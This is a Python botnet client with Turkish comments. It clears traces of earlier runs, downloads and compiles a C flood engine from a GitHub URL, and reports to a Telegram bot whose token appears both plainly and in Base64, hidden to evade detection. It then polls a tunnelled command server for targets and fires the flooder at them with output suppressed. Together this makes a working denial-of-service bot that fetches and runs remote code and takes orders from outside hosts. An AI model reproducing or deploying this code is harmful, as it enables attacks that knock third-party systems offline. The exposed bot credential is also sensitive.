#!/usr/bin/env python3
import os
import time
import requests
import subprocess
import base64

# --- GÜVENLİK VE AYARLAR ---
# Token: 8818747282:AAEHDDp6U8ZxE4Yi0l1Oeo9Nd-hMu7XuPLo
# GitHub radarına takılmaması için Base64 ile şifrelendi
D_KEY = "ODgxODc0NzI4MjpBQUVIRERwNlU4WnhFNFlpMGwxT2VvOU5kLWhNdTdYdVBMbw=="
MASTER_URL = "https://ordu-komutan-3.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"
MY_ID = "6614488737" # Kendi Telegram ID'ni buraya yaz (opsiyonel)

def s_msg(text):
    """Telegram bildirim fonksiyonu (Gizli Mod)"""
    try:
        t_kn = base64.b64decode(D_KEY).decode("utf-8")
        url = f"https://api.telegram.org/bot{t_kn}/sendMessage"
        requests.post(url, data={"chat_id": MY_ID, "text": text}, timeout=5)
    except:
        pass

def temizlik_yap():
    print("🧹 Eski mühimmatlar temizleniyor...")
    # İz bırakmamak için her şeyi temizle
    os.system("rm -f attack.py* slave.py* attack.log mermi mermi.c")
    
    print("📦 C-Engine çekiliyor...")
    # GitHub'dan mermi.c'yi çek
    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
    
    print("🛠️ Mermi Çekirdeği derleniyor...")
    # En yüksek optimizasyon (-O3) ile derleme
    derleme = os.system("gcc -O3 mermi.c -o mermi -lpthread")
    
    if derleme == 0:
        print("✅ C-Engine Hazır!")
        os.system("chmod +x mermi")
        s_msg(f"🚀 {ZOMBI_AD} Uyandı! C-Engine namluya sürüldü.")
    else:
        print("❌ GCC Hatası!")

def komut_dinle():
    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
    
    while True:
        try:
            # Bypass tunnel uyarısı ve gizli user-agent
            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-Core-V3'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                t = data.get("threads")
                s = data.get("duration")

                if method and target:
                    thread_sayisi = t if t else 150 # C-Engine için 150 kol ideal
                    print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}")

                    # Mermi kontrolü
                    if not os.path.exists("./mermi"):
                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
                        os.system("gcc -O3 mermi.c -o mermi -lpthread")

                    attack_cmd = [
                        "./mermi", 
                        str(method), str(target), str(port), 
                        str(thread_sayisi), str(s)
                    ]
                    
                    # C Motorunu 2 koldan ateşle (Hattı sature eder)
                    for _ in range(2):
                        subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    s_msg(f"🔥 {ZOMBI_AD} Ateş Başlattı!\n🎯 Hedef: {target}\n⚡ Güç: {method}")
                    print(f"✅ Vuruş başladı, loglar gizlendi.")

            time.sleep(5) # Beyni yormamak için 5 saniyede bir kontrol
            
        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    temizlik_yap()
    komut_dinle()
